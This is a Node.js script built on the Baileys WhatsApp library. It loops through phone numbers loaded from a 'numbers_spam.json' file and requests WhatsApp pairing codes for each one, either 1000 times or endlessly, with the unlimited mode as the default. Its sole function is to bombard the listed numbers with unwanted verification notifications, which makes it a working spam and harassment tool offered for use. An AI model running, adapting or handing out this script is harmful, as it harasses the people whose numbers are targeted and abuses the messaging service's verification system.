const { default: makeWASocket, useMultiFileAuthState } = require("@whiskeysockets/baileys");
const pino = require('pino');
const readline = require("readline");
const fs = require('fs');

const question = (text) => {
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    return new Promise((resolve) => { rl.question(text, resolve) });
};

async function XeonProject() {
    const { state } = await useMultiFileAuthState('./session');
    const XeonBotInc = makeWASocket({
        logger: pino({ level: "silent" }),
        printQRInTerminal: false,
        auth: state,
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 0,
        keepAliveIntervalMs: 10000,
        emitOwnEvents: true,
        fireInitQueries: true,
        generateHighQualityLinkPreview: true,
        syncFullHistory: true,
        markOnlineOnConnect: true,
        browser: ["Ubuntu", "Chrome", "20.0.04"],
    });

    let phoneNumbers = [];

    const loadNumbers = () => {
        const phoneNumbersData = JSON.parse(fs.readFileSync('numbers_spam.json', 'utf8'));
        phoneNumbers = Object.values(phoneNumbersData).flat();
    };

    loadNumbers(); // تحميل الأرقام عند بدء البرنامج

    const option = await Promise.race([
        question('Choose an option:\n1. 1000\n2. Unlimited\nEnter your choice (1 or 2): '),
        new Promise((resolve) => setTimeout(() => resolve('2'), 1000))
    ]);

    let count = 0;

    // تحقق من الأرقام كل ثانية
    setInterval(() => {
        loadNumbers();
    }, 1000);

    try {
        if (option === '1') {
            const xeonCodes = 1000;
            for (let i = 0; i < xeonCodes; i++) {
                for (const phoneNumber of phoneNumbers) {
                    await sendPairingCode(XeonBotInc, phoneNumber, i + 1, xeonCodes);
                }
            }
        } else {
            while (true) {
                for (const phoneNumber of phoneNumbers) {
                    await sendPairingCode(XeonBotInc, phoneNumber, ++count);
                }
            }
        }
    } catch (error) {
        console.error('error:', error);
    }

    return XeonBotInc;
}

async function sendPairingCode(XeonBotInc, phoneNumber, index, total) {
    try {
        let code = await XeonBotInc.requestPairingCode(phoneNumber);
        code = code?.match(/.{1,4}/g)?.join("-") || code;
        console.log(`${phoneNumber} [${index}/${total || 'Unlimited'}]`);
    } catch (error) {
        console.error('Error:', error.message);
    }
}

XeonProject();
